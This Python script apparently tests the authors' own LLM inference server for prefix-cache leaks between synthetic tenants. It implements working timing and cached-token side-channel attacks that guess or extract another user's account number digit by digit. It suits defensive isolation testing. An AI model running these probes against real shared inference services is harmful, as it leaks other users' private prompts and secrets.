#!/usr/bin/env python3
"""Prefix-cache attacks against our own server, with synthetic tenants only.

Two attacks, both played by Eve against Alice. Eve is in the same org as
Alice, so she legitimately shares the org system prompt: the strongest
insider position the labels have to hold against.

guess    Eve knows the template of Alice's message and a list of K candidate
         account ids. Alice sends one. Eve probes every candidate once and
         picks the one that came back fastest (timing channel) and the one
         with the most cached tokens (metadata channel). The secret sits near
         the start of a long form, so a correct guess makes the whole form a
         cache hit.

extract  Eve knows only the sentence shape. She recovers Alice's account
         number digit by digit: for each position she probes the ten digits,
         and the one whose cached-token count is uniquely highest is the
         victim's. Needs a tokenizer that splits digits (Qwen does).

Run against a live server with attack/run_pod.py. Never point this at a
service you don't own.
"""

from __future__ import annotations

import json
import random
import statistics
import time
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Callable, Optional, Protocol

BASE_SYSTEM = "You are Acme Corp's internal billing assistant. Answer briefly."

FORM = " ".join(
    f"Section {i}. The account holder confirms that the billing details listed above are accurate, "
    f"that disputed charges must be reported within thirty days, and that Acme may contact the holder "
    f"about this request using the channel on file."
    for i in range(1, 13)
)


class Server(Protocol):
    def post(self, path: str, body: dict, headers: Optional[dict] = None) -> tuple[int, dict, float]: ...


Minter = Callable[[str, str, list], Optional[str]]  # (user, org, shared_messages) -> token or None


@dataclass
class Probe:
    status: int
    cached: Optional[int]
    prompt_tokens: Optional[int]
    latency: float


def _find(obj, key):
    if isinstance(obj, dict):
        if key in obj:
            return obj[key]
        for v in obj.values():
            if (r := _find(v, key)) is not None:
                return r
    elif isinstance(obj, list):
        for v in obj:
            if (r := _find(v, key)) is not None:
                return r
    return None


def chat(server: Server, model: str, messages: list, token: Optional[str]) -> Probe:
    body = {"model": model, "messages": messages, "max_tokens": 1, "temperature": 0}
    status, resp, latency = server.post("/v1/chat/completions", body, {"X-Ifab-Token": token} if token else {})
    usage = resp.get("usage") or {}
    return Probe(status, _find(usage, "cached_tokens"), usage.get("prompt_tokens"), latency)


def _system(rng: random.Random) -> dict:
    # A fresh session line per trial, so trials don't see each other's cache entries.
    return {"role": "system", "content": f"{BASE_SYSTEM} Session {rng.getrandbits(48):012x}."}


def _flush(server) -> bool:
    """Empty the server's prefix cache between trials, so one trial's probes
    can't evict the next trial's victim entry. Returns whether it worked."""
    flush = getattr(server, "flush", None)
    return bool(flush and flush())


def _send(server, model, mint: Minter, user, org, system, text) -> Probe:
    msgs = [system, {"role": "user", "content": text}]
    p = chat(server, model, msgs, mint(user, org, [system]))
    if p.status != 200:
        raise RuntimeError(f"{user}'s request failed with HTTP {p.status}")
    return p


def guess_attack(server: Server, model: str, mint: Minter, k: int = 20, trials: int = 10,
                 seed: int = 0, warmup: int = 3) -> dict:
    rng = random.Random(seed)
    meta_hits = timing_hits = 0
    gaps, flushed = [], []
    for _ in range(trials):
        flushed.append(_flush(server))
        system = _system(rng)
        ids = [f"{n:06d}" for n in rng.sample(range(10**6), k)]
        secret = rng.choice(ids)
        _send(server, model, mint, "alice", "acme", system, f"Account {secret}. {FORM}")
        for i in range(warmup):  # Eve warms her own path so the first probe isn't penalized
            _send(server, model, mint, "eve", "acme", system, f"Warmup {i}.")
        order = ids[:]
        rng.shuffle(order)
        probes = {c: _send(server, model, mint, "eve", "acme", system, f"Account {c}. {FORM}") for c in order}

        fastest = min(order, key=lambda c: probes[c].latency)
        timing_hits += fastest == secret
        others = [probes[c].latency for c in order if c != secret]
        gaps.append(statistics.median(others) - probes[secret].latency)

        cached = {c: probes[c].cached or 0 for c in order}
        top = max(cached.values())
        best = [c for c in order if cached[c] == top]
        meta_hits += rng.choice(best) == secret  # ties are a coin flip: chance, not a hit
    return {
        "attack": "guess", "k": k, "trials": trials, "chance": round(1 / k, 3),
        "timing_accuracy": round(timing_hits / trials, 3),
        "metadata_accuracy": round(meta_hits / trials, 3),
        "median_latency_gap_ms": round(statistics.median(gaps) * 1000, 2),
        "cache_flushed_between_trials": all(flushed),
    }


def extract_attack(server: Server, model: str, mint: Minter, digits: int = 6, trials: int = 5,
                   seed: int = 1) -> dict:
    rng = random.Random(seed)
    recovered, full, flushed = [], 0, []
    for _ in range(trials):
        flushed.append(_flush(server))
        system = _system(rng)
        account = "".join(rng.choice("0123456789") for _ in range(digits))
        _send(server, model, mint, "alice", "acme", system,
              f"My account number is {account}. Please check my balance.")
        known = ""
        for _pos in range(digits):
            cand = list("0123456789")
            rng.shuffle(cand)
            cached = {d: _send(server, model, mint, "eve", "acme", system,
                               f"My account number is {known}{d}").cached or 0 for d in cand}
            top = max(cached.values())
            best = [d for d in cand if cached[d] == top]
            if len(best) != 1:
                break  # no signal: Eve can't tell which digit Alice sent
            known += best[0]
        n_right = len(known) if account.startswith(known) else 0
        recovered.append(n_right)
        full += known == account
    return {
        "attack": "extract", "digits": digits, "trials": trials,
        "mean_digits_recovered": round(statistics.mean(recovered), 2),
        "full_recovery_rate": round(full / trials, 3),
        "cache_flushed_between_trials": all(flushed),
    }


def extract_blocks_attack(server: Server, model: str, mint: Minter, digits: int = 6, trials: int = 5,
                          seed: int = 1, max_group: int = 3) -> dict:
    """extract, for engines that cache and report whole blocks (vLLM: 16 tokens).

    A single guessed digit only moves the cached count when it completes a
    block, so Eve guesses groups: she tries every 1-digit continuation, then
    every 2-digit one, and so on, until exactly one probe raises the cached
    count above the rest. That group is Alice's, and she moves on. The last
    group may end inside Alice's sentence, so those probes also carry the
    sentence's known ending. Groups longer than max_group (10**max_group probes)
    are given up: Eve's cost grows tenfold per digit she must guess at once.
    """
    rng = random.Random(seed)
    tail = ". Please check my balance."
    recovered, full, probes_used, flushed = [], 0, [], []
    for _ in range(trials):
        flushed.append(_flush(server))
        system = _system(rng)
        account = "".join(rng.choice("0123456789") for _ in range(digits))
        _send(server, model, mint, "alice", "acme", system, f"My account number is {account}{tail}")
        known, n_probes = "", 0
        while len(known) < digits:
            found = None
            for size in range(1, min(max_group, digits - len(known)) + 1):
                suffix = tail if len(known) + size == digits else ""
                cands = [f"{n:0{size}d}" for n in range(10**size)]
                rng.shuffle(cands)
                cached = {}
                for c in cands:
                    cached[c] = _send(server, model, mint, "eve", "acme", system,
                                      f"My account number is {known}{c}{suffix}").cached or 0
                n_probes += len(cands)
                top = max(cached.values())
                best = [c for c in cands if cached[c] == top]
                if len(best) == 1 and top > min(cached.values()):
                    found = best[0]
                    break
            if found is None:
                break  # Alice's next block needs more digits at once than Eve will try
            known += found
        recovered.append(len(known) if account.startswith(known) else 0)
        full += known == account
        probes_used.append(n_probes)
    return {
        "attack": "extract_blocks", "digits": digits, "trials": trials, "max_group": max_group,
        "mean_digits_recovered": round(statistics.mean(recovered), 2),
        "full_recovery_rate": round(full / trials, 3),
        "mean_probes": round(statistics.mean(probes_used), 1),
        "cache_flushed_between_trials": all(flushed),
    }


class HttpServer:
    """Minimal client for a running server (stdlib only)."""

    def __init__(self, url: str):
        self.url = url.rstrip("/")

    def post(self, path, body, headers=None):
        req = urllib.request.Request(self.url + path, data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json", **(headers or {})})
        t0 = time.perf_counter()
        try:
            with urllib.request.urlopen(req, timeout=300) as r:
                return r.status, json.loads(r.read()), time.perf_counter() - t0
        except urllib.error.HTTPError as e:
            return e.code, {}, time.perf_counter() - t0

    def flush(self) -> bool:
        return flush_url(self.url)


def flush_url(url: str) -> bool:
    """Empty the server's prefix cache: POST /flush_cache (SGLang) or
    /reset_prefix_cache (vLLM, dev mode). SGLang answers in plain text and
    refuses while requests are in flight, so retry briefly."""
    for _ in range(10):
        for path in ("/flush_cache", "/reset_prefix_cache"):
            try:
                with urllib.request.urlopen(urllib.request.Request(url.rstrip("/") + path, data=b"",
                                                                   method="POST"), timeout=30) as r:
                    if r.status == 200:
                        return True
            except (urllib.error.URLError, ConnectionError, TimeoutError):
                pass
        time.sleep(0.5)
    return False
